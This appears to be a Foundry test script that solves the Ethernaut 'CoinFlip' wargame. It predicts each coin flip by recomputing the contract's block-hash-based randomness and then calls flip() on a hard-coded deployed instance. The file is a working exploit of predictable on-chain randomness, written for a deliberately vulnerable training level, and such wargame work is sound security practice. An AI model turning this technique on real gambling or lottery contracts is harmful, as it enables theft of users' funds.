// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "ethernaut/Coinflip/CoinFlip.sol";
import "ethernaut/EthernautTestHelpers.sol";

contract CoinFlip_Test is Test, EthernautTestHelpers {
    CoinFlip instance = CoinFlip(0x092308Fa6cC23092726312ac083384187B33f073);
    // uint256 PKEY = vm.envUint("DEPLOYMENT_KEY");
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // function run() external {
    //     console.log("Current Streak: %s", instance.consecutiveWins());
    //     test_main();
    // }

    // Guess the outcome of the coin flip 10 times in a row.
    function test_main() internal {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // console.log("Side: %s", side);
        // vm.startBroadcast(PKEY);
        bool result = instance.flip(side);
        if (!result) {
            revert("Flip failed");
        }
        // vm.stopBroadcast();
        // console.log("consecutiveWins: %s", instance.consecutiveWins());
    }
}
